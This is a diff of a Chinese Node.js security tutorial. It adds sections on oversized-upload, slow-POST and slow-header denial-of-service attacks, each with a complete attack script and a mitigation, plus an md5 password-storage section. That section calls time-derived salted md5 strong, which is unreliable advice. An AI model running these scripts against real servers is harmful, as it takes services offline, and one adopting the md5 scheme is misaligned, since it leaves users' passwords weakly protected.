@@ -75,21 +75,18 @@ Node.js作为一门新型的开发语言，很多开发者都会用它来进行�
 
     Mem:   3925040k total,  3290428k used,   634612k free,   170324k buffers
 	
-可以看到，我们的攻击脚本只用了一个`socket`连接就消耗了大量Node.js服务器的内存，攻击脚本执行之后Node.js服务内存占用比之前多达200倍，如果有2-3个恶意攻击`socket`连接，Node.js服务器物理内存必然用完，然后开始频繁的交换从而失去响应或者进程奔溃。
+可以看到，我们的攻击脚本只用了一个`socket`连接就消耗了大量Node.js服务器的内存，更可怕的是这部内存不会自动释放，需要手动重启进程才能回收。攻击脚本执行之后Node.js服务内存占用比之前多达200倍，如果有2-3个恶意攻击`socket`连接，Node.js服务器物理内存必然用完，然后开始频繁的交换从而失去响应或者进程奔溃。
 	
 ##Sql注入
 从1998年12月`Sql注入`首次进入人们的视线至今，`Sql注入`已经有10几个年头了，虽然我们已经有了很全面的防范`Sql注入`的对策，但是它的威力还是不容小觑。
 
 ###注入技巧
 
-###防范措施
 
-##NoSql注入
-对于流行的非关系型数据库，是不是`Sql注入`就不适用了呢？答案是否定的，只要我们稍不注意，非关系型数据库还是会成为攻击者下手的对象。
-
-###Mongodb注入实例
 
 ###防范措施
+
+
 
 ##XSS脚本攻击
 `XSS`是什么？它的全名是：`Cross-site scripting`，为了和`CSS层叠样式表`区分所以取名`XSS`。是一种网站应用程序的安全漏洞攻击，是代码注入的一种。它允许恶意用户将代码注入到网页上，其他用户在观看网页时就会受到影响。这类攻击通常包含了`HTML`以及用户端脚本语言。
@@ -300,12 +297,200 @@ cnodejs注入的风波暂时平息了，不过真的禁用所有输入的`HTML`�
 ###应用层和网络层的Dos
 
 ###超大Buffer
+我们现在需要有这样的web接口，接受用户传递上来的`json`字符串，然后将其保存到数据库中，我们简单构建如下代码：
+
+    var http = require('http');
+    http.createServer(function (req, res) {
+      if(req.url === '/json' && req.method === 'POST'){//获取用上传代码
+      var body = [];
+        req.on('data',function(chunk){
+          body.push(chunk);//获取buffer
+        })
+        req.on('end',function(){
+          body = Buffer.concat(body);
+          res.writeHead(200, {'Content-Type': 'text/plain'});
+          //db.save(body) 这里数据库入库操作
+          res.end('ok');
+        })  
+      }
+    }).listen(8124);
+
+我们使用buffer数组保存用户发送过来的数据，最后通过`Buffer.concat`将所有`buffer`连接起来插入数据库。注意这部分代码：
+
+    req.on('data',function(chunk){
+          body.push(chunk);//获取buffer
+    })
+
+不能用下面简单的字符串拼接来代替，可能我收到的内容不是`utf-8`格式，另外从拼接性能上来说两者也不是一个数量级的，我们看如下测试：
+
+    var buf = new Buffer('nodejsv0.10.4&nodejsv0.10.4&nodejsv0.10.4&nodejsv0.10.4&');
+    console.time('string += buf');
+    var s = '';
+    for(var i=0;i<100000;i++){
+        s += buf;
+    }
+    s;
+    console.timeEnd('string += buf');
+
+
+    console.time('buf concat');
+    var list = [];
+    var len=0;
+    for(var i=0;i<100000;i++){
+        list.push(buf);
+        len += buf.length;
+    }
+    var s2 = Buffer.concat(list, len).toString();
+    console.timeEnd('buf concat');
+
+这个测试脚本分别使用两种不通的方式将`buf`连接10W次起来返回字符串，我们看下运行结果：
+
+    string += buf: 66ms
+    buf concat: 33ms
+
+我们可以看到运行结果相差了整整一倍，所以当我们在接受这类情况的数据时，建议还是使用`Buffer.concat`来做。
+
+我们现在开始构建一个超大的具有`700mb`的`buffer`，然后把它保存成文件:
+
+    var fs = require('fs');
+    var buf = new Buffer(1024*1024*700);
+    buf.fill('h');
+    fs.writeFile('./large_file', buf, function(err){
+      if(err) return console.log(err);
+      console.log('ok')
+    })
+
+我们构建攻击脚本，把这个超大的文件发送出去，如果接收我们这个`POST`的Node.js服务器是内存只有`512mb`的小型云主机，那么当攻击者上传这个超大文件后，云主机内存会消耗殆尽。
+
+    var http = require('http');
+    var fs = require('fs');
+    var options = {
+      hostname: '127.0.0.1',
+      port: 8124,
+      path: '/json',
+      method: 'POST'
+    };
+    var request = http.request(options, function(res) {
+        res.setEncoding('utf8');
+        res.on('readable', function () {
+          console.log(res.read());
+        });
+    });
+    fs.createReadStream('./large_file').pipe(request);
+
+我们看一下Node.js服务器在受攻击前后内存的使用情况：
+
+    { rss: 14225408, heapTotal: 6147328, heapUsed: 2688280 }
+    { rss: 15671296, heapTotal: 7195904, heapUsed: 2861704 }
+    { rss: 822194176, heapTotal: 78392696, heapUsed: 56070616 }
+    { rss: 1575043072, heapTotal: 79424632, heapUsed: 43795160 }
+    { rss: 1575579648, heapTotal: 80456568, heapUsed: 43675448 }
+
+那我们应该如何解决这类恶意攻击呢？我们只需要将Node.js服务器代码修改如下就可以避免用户上传过大的数据了：
+
+    var http = require('http');
+    http.createServer(function (req, res) {
+      if(req.url === '/json' && req.method === 'POST'){//获取用上传代码
+      var body = [];
+      var len = 0;//定义变量用来记录用户上传文件大小
+        req.on('data',function(chunk){
+            body.push(chunk);//获取buffer
+            len += chunk.length;
+            if(len>=1024*1024){//每次收到一个buffer块都要比较一下是否超过1mb
+                res.end('too large');//直接响应错误
+            }
+        })
+        req.on('end',function(){
+           body = Buffer.concat(body,len);
+           res.writeHead(200, {'Content-Type': 'text/plain'});
+           //db.save(body) 这里数据库入库操作
+           res.end('ok');
+        })  
+      }
+    }).listen(8124);
+
+通过上述代码，我们每次收到一个`buffer`块都会去比较一下大小，如果数据超大则会立刻截断上传，保证恶意用户无法上传超大文件了。
 
 ###Slowlori攻击
+`Post`慢速`DoS`攻击是在2010年OWASP大会上被披露的，这种攻击方式针对配置较低的服务器具有很强的威力，往往几台攻击客户端就轻松可以击垮一台web应用服务器。
 
-###Post攻击
+攻击者先向web应用服务器发起一个正常的`POST`请求，设定一个在web服务器限定范围内并且比较大的`Content-Length`，然后以非常慢的速度，比如30秒左右发送一次`10byte`的数据给服务器，保持这个连接不释放，因为客户端一直在向服务器发包，所以服务器也不会认为连接超时，这样服务器的一个`tcp`连接就一直被这样一个慢速的`POST`占用，极大的浪费了服务器资源。
 
-###Https业务接口
+这个攻击可以针对任意一个web服务器进行，所以受众面非常广；而且此类攻击手段非常简单和廉价，一般一台普通的个人计算机就可以提供2-3千个`tcp`连接，所以只要同时有几台攻击机器，web服务器可能就会立马因为连接数耗尽而拒绝服务。
+
+下面是一个Node.js版本的Slowlori攻击恶意脚本：
+
+    var http = require('http');
+    var options = {
+      hostname: '127.0.0.1',
+      port: 8124,
+      path: '/json',
+      method: 'POST',
+      headers:{
+      "Content-Length":1024*1024
+      }
+    };
+    var max_conn = 1000;
+    http.globalAgent.maxSockets = max_conn;//设定最大请求连接数
+    var reqArray = [];
+    var buf = new Buffer(1024);
+    buf.fill('h');
+    while(max_conn--){
+      var req = http.request(options, function(res) {
+          res.setEncoding('utf8');
+          res.on('readable', function () {
+            console.log(res.read());
+          });
+      });
+      reqArray.push(req);
+    }
+    setInterval(function(){//定时隔5秒发送一次
+      reqArray.forEach(function(v){
+        v.write(buf);
+      })
+    },1000*5);
+
+由于Node.js的天生单线程优势，我们可以只写一个定时器，而不用像其他语言创建1000个线程每个线程里面一个定时器在那里跑，这样效率更高一些。有网友经过测试，发现慢`POST`攻击对`Apache`的效果十分明显，`Apache`的`maxClients`几乎在瞬间被锁住，浏览器在攻击进行期间甚至无法无法访问测试页面。
+
+想要抵挡这类慢`POST`攻击，我们可以在Node.js应用前面放置一个靠谱的web服务器，比如`Nginx`，合理的配置可以有效的减轻这类攻击带来的影响。
+
+###Http Header攻击
+一般web服务器都会设定`HTTP`请求头的接收时长，是指在指定的时长内客户端必须把`HTTP`的`head`发送完毕，如果web服务器在这方面没有做限制，我们也可以用同样的原理慢速的发送`head`数据包，造成服务器连接的浪费，这样的攻击同样适用于其他web服务器。
+
+    var net = require('net');
+    var maxConn = 1000;
+    var head_str = 'GET / HTTP/1.1\r\nHost: 192.168.17.55\r\n'
+    var clientArray = [];
+    while(maxConn--){
+      var client = net.connect({port: 8124, host:'192.168.17.55'});
+        client.write(head_str);
+        client.on('error',function(e){
+           console.log(e)
+        })
+        client.on('end',function(){
+           console.log('end')
+        })
+        clientArray.push(client);
+    }
+    setInterval(function(){//定时隔5秒发送一次
+      clientArray.forEach(function(v){
+          v.write('xhead: gap\r\n');
+      })
+    },1000*5);
+
+这里我定义了一个永远发不完的请求头，定时每5秒钟发送一个请求头，类似慢`POST`攻击，我们慢慢悠悠的发送`HTTP`请求头，当连接数耗尽服务器也就拒绝响应服务了。
+
+随着我们连接数增加，Node.js服务器最终可能会因为打开文件数过多而崩溃：
+
+    /usr/local/nodejs/test/http_server.js:10
+            console.log(process.memoryUsage());
+                                ^
+    Error: EMFILE, too many open files
+        at null.<anonymous> (/usr/local/nodejs/test/http_server.js:10:22)
+        at wrapper [as _onTimeout] (timers.js:252:14)
+        at Timer.listOnTimeout [as ontimeout] (timers.js:110:15)
+
+Node.js对用户`HTTP`的请求响应头做了大小限制，最大不能超过`50KB`，所以我无法向`HTTP`请求头里发送大量的数据从而造成服务器内存占用。
 
 ##文件路径漏洞
 文件路径漏洞也是非常致命的，常常伴随着被恶意用户挂木马或者代码泄漏，由于Node.js提供的Http模块非常的底层，所以很多工作需要开发者自己来完成，可能因为业务比较简单也没有使用成熟的框架，在写代码时稍不注意就会带来安全隐患。
@@ -320,7 +505,6 @@ cnodejs注入的风波暂时平息了，不过真的禁用所有输入的`HTML`�
     var http = require('http');
     var fs = require('fs');
     var upLoadPage = fs.readFileSync(__dirname+'/upload.html');
-
     http.createServer(function (req, res) {
       res.writeHead(200, {'Content-Type': 'text/html'});//响应头设置html
       if(req.url === '/' && req.method === 'GET'){//请求根目录，获取上传文件页面
@@ -524,10 +708,82 @@ app.js是我们之前的服务器文件，`hack`文件夹存放的就是恶意�
 
 相信有了之前的解决方案，这边读者自行也可以轻松搞定了。
 
-##加密攻击
+##加密安全
+我们在做web开发时会用到各种各样的加密解密，传统的加解密大致可以分为三种:
 
-###Md5存储密码
+（1）对称加密，
 
-###随机数漏洞
+（2）非对称加密，
+
+（3）不可逆加密，
+
+我们在开发过程中可以使用Node.js的`Crypto`模块来进行相关的操作。
+
+###md5存储密码
+在开发网站用户系统的时候，我们都会面临用户密码如何存储的问题，明文存储当然是不行的，之前有很多历史教训告诉我们，明文存储密码一旦数据库被攻破，用户资料将会全部展现给攻击者，给我们带来巨大的损失。
+
+目前比较流行的做法是对用户注册时的密码进行`md5`加密存储，下次用户登录的时候，用同样的算法生成`md5`字符串和数据库原有的`md5`字符串进行比对，从而判断密码正确与否。这样做的好处不言而喻，一旦数据泄漏，恶意用户也是无法直接获取用户密码的，因为`md5`加密是不可逆的。
+
+但是`md5`加密有一个特点，同样的一个字符串经过`md5`算法之后总是会生成同样的加密字符串，所以攻击者可以利用强大的`md5`彩虹表来逆推加密前的原始字符串，下面我来看个例子：
+
+    var crypto = require('crypto');
+    var md5 = function (str, encoding){
+      return crypto
+        .createHash('md5')
+        .update(str)
+        .digest(encoding || 'hex');
+    };
+    var password = 'nodejs';
+    console.log(md5(password));
+
+上面代码我们对字符串`nodejs`进行了`md5`加密存储，打印的加密字符串如下：
+
+    671a0da0ba061c98de801409dbc57d7e
+
+我们通过谷歌搜索`md5解密`关键字，进入一个在线`md5破解`的网站，输入刚才的加密字符串进行破解：
+
+![md5 1](http://farm3.staticflickr.com/2853/11076805805_4787f30557_o.png)
+
+我们发现虽然`md5`加密不可逆，但还是被破解出来了，于是我们改良下算法，为所有用户密码存储加上统一的`salt`值，而不是直接的进行`md5`加密：
+
+    var crypto = require('crypto');
+    var md5 = function (str, encoding){
+      return crypto
+        .createHash('md5')
+        .update(str)
+        .update('abc') //这边加入固定的salt值用来加密
+        .digest(encoding || 'hex');
+    };
+    var password = 'nodejs';
+    console.log(md5(password));
+
+这次我们对用户密码增加了`salt`统一的字符串`abc`，然后进行`md5`加密，我们还是把生成的加密字符串放入破解网站进行破解：
+
+![md5 2](http://farm6.staticflickr.com/5542/11076895556_7980d2f8e5_o.png)
+
+网站提示我们要交费才能查看结果，但是密码还是被他破解出来了，看来一些统一的简单的`salt`值是无法满足加密需求的。
+
+所以比较好的保存用户密码的方式应该是在`user`表增加一个`salt`字段，每次用户注册都要去随机生成一个位数够长的`salt`字符串，然后再根据这个`salt`值加密密码，相关流程代码如下：
+
+    var crypto = require('crypto');
+    var md5 = function (str, encoding){
+      return crypto
+        .createHash('md5')
+        .update(str)
+        .digest(encoding || 'hex');
+    };
+    var gap = '-';
+    var password = 'nodejs';
+    var salt = md5(Date.now().toString());
+    var md5Password = md5(salt+gap+password);
+    console.log(md5Password);
+    //0199c7e47cb9b55adac21ebc697673f4
+
+这样我们生成的加密密码就足够强壮了，就算攻击者拿到了我们数据库，由于他没有我们的代码，不知道我们的加密规则所以也就很难破解用户的真实密码，而且每个用户的密码加密`salt`值都不同，给破解也带来不少难度。
 
 ##小结
+
+
+#参考文献
+- <http://www.unclejoey.com/2010/12/28/http-post%E6%85%A2%E9%80%9Fdos%E6%94%BB%E5%87%BB%E5%88%9D%E6%8E%A2/> HTTP POST慢速DOS攻击
+- <http://www.darkreading.com/galleries/security/application-security/228400167/slide-show-ddos-with-the-slow-http-post-attack.html> slow http post attack
